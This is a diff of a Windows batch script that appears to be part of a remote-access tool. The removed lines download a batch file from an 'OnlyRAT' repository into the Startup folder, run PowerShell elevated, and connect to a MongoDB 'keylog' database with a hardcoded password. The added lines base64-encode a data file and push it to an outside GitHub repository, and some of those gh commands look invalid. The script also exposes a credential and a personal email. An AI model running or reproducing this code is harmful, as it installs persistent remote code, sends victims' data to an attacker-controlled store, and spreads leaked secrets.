@@ -1,18 +1,42 @@
-:: adminTest.cmd
-
 @echo off
 
-REM Set the path for admin.bat
-set "adminScript=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\admin.bat"
+setlocal enabledelayedexpansion
 
-REM Download the admin.bat file
-powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin/admin.bat', '%adminScript%')"
+REM Generate a random string for the file name
+set "chars=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+set "length=8"
+set "randomString="
+for /l %%i in (1,1,%length%) do (
+    set /a "idx=!random! %% 62"
+    for %%j in (!idx!) do (
+        set "randomString=!randomString!!chars:~%%j,1!"
+    )
+)
 
-REM Open PowerShell window as admin and execute the command to install the module
-powershell -Command "Start-Process powershell.exe -ArgumentList '-NoProfile -Command \"Install-Module -Name Mdbc\"' -Verb RunAs"
+REM Define file path
+set "filePath=C:\Everything\python\%randomString%.json"
 
-timeout /t 10 /nobreak >nul
+REM Create a new JSON file
+echo { "name": "John Doe", "email": "john.doe@example.com" } > "%filePath%"
 
-powershell -Command "Start-Process powershell.exe -ArgumentList '-NoProfile -Command \"Import-Module -Name Mdbc; Connect-Mdbc -ConnectionString \"mongodb+srv://klausm1024:R16BZkWn2HZQAzD7@cluster0.uq9lhec.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0" -DatabaseName \"keylog\" -CollectionName \"users\"\"' -Verb RunAs"
+REM Encode the file content in base64
+certutil -encode "%filePath%" "%filePath%.b64" >nul
 
-echo MongoDB connection status: Connected
+REM Read the base64 content
+set /p BASE64_CONTENT=<"%filePath%.b64"
+
+REM Define GitHub API endpoint parameters
+set "owner=klausx99"
+set "repo=key"
+set "path=%randomString%.json"
+set "message=Updating JSON data"
+set "committerName=klausx99"
+set "committerEmail=klaus.m1024@gmail.com"
+
+REM Upload the file to GitHub using GitHub CLI
+gh repo view %owner%/%repo%
+gh repo create %owner%/%repo% --confirm
+gh repo upload %owner%/%repo% %filePath% --message "%message%"
+
+echo Script execution completed
+pause
